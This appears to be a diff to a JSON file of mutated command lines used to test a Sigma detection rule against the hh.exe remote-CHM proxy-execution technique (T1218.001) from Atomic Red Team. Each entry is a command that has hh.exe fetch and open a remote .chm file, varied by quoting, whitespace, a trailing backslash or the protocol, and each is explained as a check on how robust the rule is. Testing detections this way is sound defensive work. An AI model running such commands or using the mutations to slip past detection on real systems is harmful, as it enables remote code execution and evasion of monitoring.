@@ -1,6 +1,22 @@
 [
   {
+    "output": "hh.exe \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm\"",
+    "explanation": "Inserted quotes around the URL to test if the Sigma rule detects quoted command lines."
+  },
+  {
     "output": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm",
-    "explanation": "The original command is already a valid test case for the Sigma rule. No mutation is needed to trigger the rule."
+    "explanation": "Original command line used as a baseline for comparison."
+  },
+  {
+    "output": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm ",
+    "explanation": "Added a trailing space to test if the Sigma rule is sensitive to trailing whitespace."
+  },
+  {
+    "output": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm\\",
+    "explanation": "Modified the URL by appending a backslash to test if the Sigma rule detects such variations."
+  },
+  {
+    "output": "hh.exe http://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm",
+    "explanation": "Replaced 'https://' with 'http://' to test if the Sigma rule is sensitive to protocol variations."
   }
 ]
